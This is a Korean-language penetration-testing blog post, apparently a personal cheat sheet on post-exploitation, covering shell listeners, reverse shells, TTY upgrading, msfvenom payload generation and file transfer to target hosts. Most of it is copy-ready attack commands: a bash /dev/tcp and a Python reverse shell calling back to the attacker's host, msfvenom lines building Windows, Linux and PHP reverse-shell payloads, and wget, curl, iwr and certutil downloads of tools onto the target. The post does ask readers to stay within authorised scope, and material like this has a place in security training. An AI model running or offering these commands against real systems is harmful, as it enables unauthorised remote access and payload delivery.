---
title: "셸·페이로드·파일전송 도구 치트시트"
date: 2026-10-17 09:00:00 +0900
categories: [Penetration Testing, Post-Exploitation]
tags: [reverse-shell, netcat, msfvenom, file-transfer, cheatsheet]
description: "리스너 준비, 리버스/바인드 셸, msfvenom 페이로드 생성, 그리고 호스트 간 파일 전송을 상황별로 정리한 치트시트입니다."
mermaid: true
---

> 셸은 "리스너를 먼저 띄우고 → 대상이 나에게 연결(리버스)"가 기본입니다. 방화벽이 아웃바운드만 허용하는 환경에서 리버스가 바인드보다 잘 통합니다. 예시의 `$LHOST`·`$LPORT`는 내 쪽 주소/포트입니다.

## 개념

```mermaid
flowchart LR
  L[리스너 대기] --> P[페이로드 전달]
  P --> R[대상이 역접속]
  R --> U[셸 안정화]
```

- **리버스 셸**: 대상 → 나. 아웃바운드 허용 환경에서 유리.
- **셸 안정화(TTY)**: 받은 셸을 바로 쓰면 Ctrl-C에 죽습니다. 먼저 업그레이드.
- **파일 전송**: 임시 HTTP 서버가 가장 간단하고 범용.

## 공격·우회 구문

허가된 범위에서만. `$LHOST`/`$LPORT`는 내 쪽입니다.

### 리스너 · 리버스 셸

```bash
# 리스너
nc -lvnp $LPORT

# 리눅스 대상 리버스 셸(여러 변형 중 하나)
bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1

# 파이썬 변형
python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("'$LHOST'",'$LPORT'));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/sh")'
```

### 셸 안정화(TTY 업그레이드)

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl-Z 후
stty raw -echo; fg
export TERM=xterm
```

> 판단 포인트: 셸을 안정화하기 전에는 `su`·`sudo`·대화형 프로그램이 멎습니다. 권한상승을 시작하기 전에 TTY부터 올립니다.

### msfvenom — 페이로드 생성

```bash
# 윈도우 실행형 리버스 셸
msfvenom -p windows/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f exe -o rev.exe

# 리눅스 ELF
msfvenom -p linux/x64/shell_reverse_tcp LHOST=$LHOST LPORT=$LPORT -f elf -o rev.elf

# 웹 — PHP
msfvenom -p php/reverse_php LHOST=$LHOST LPORT=$LPORT -f raw -o rev.php
```

> 판단 포인트: 아키텍처(x86/x64)와 스테이지(staged `shell/...` vs non-staged `shell_reverse...`)를 리스너와 맞춰야 합니다. 안 맞으면 연결은 되는데 셸이 안 뜹니다.

### 파일 전송

```bash
# 공격 호스트에서 임시 서버
python3 -m http.server 80

# 리눅스 대상에서 받기
wget http://$LHOST/tool -O tool ; curl http://$LHOST/tool -o tool
```

```powershell
# 윈도우 대상에서 받기
iwr -uri http://$LHOST/tool.exe -Outfile tool.exe
certutil -urlcache -f http://$LHOST/tool.exe tool.exe
```

## 함께 보기

- [원격접속·측면이동 도구 치트시트](/notes/remote-access-lateral-cheatsheet/)
- [모의침투 작전 흐름](/notes/penetration-testing-operation-flow/)

## 참고 자료

- [MITRE ATT&CK: Ingress Tool Transfer (T1105)](https://attack.mitre.org/techniques/T1105/)
- [MITRE ATT&CK: Command and Scripting Interpreter (T1059)](https://attack.mitre.org/techniques/T1059/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
